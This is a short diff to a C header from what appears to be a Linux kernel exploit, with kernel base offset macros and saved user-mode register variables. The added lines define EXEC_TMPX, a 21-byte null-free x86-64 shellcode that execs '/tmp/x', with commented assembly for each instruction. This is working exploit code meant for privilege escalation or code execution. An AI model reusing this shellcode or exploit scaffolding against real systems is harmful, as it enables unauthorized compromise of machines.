@@ -14,7 +14,14 @@
 #define DUMMY_VALUE (0xddddddddddddddddull)
 #define default_kbase (0xffffffff81000000ull)
 #define kbase_offset (kbase - default_kbase)
-#define PAGE_SIZE (0x1000)
+// rax = 0x3b            : push 0x3b; pop rax;
+// rdx = 0               : cdq;
+// rdi = "/tmp/x"        : push *(u64 *)"mp/x\0\0\0\0"; pushw *(u16 *)"/t"; push rsp; pop rdi;
+// rsi = ["/tmp/x", NULL]: push rdx; push rdi; push rsp; pop rsi;
+// execve                : syscall;
+// 21 bytes, non null bytes
+#define EXEC_TMPX \
+    "\x6a\x3b\x58\x99\x68\x6d\x70\x2f\x78\x66\x68\x2f\x74\x54\x5f\x52\x57\x54\x5e\x0f\x05"
 extern u64 user_cs, user_ss, user_rsp, user_rflags;
 extern u64 kbase;
 extern u64 kheap;
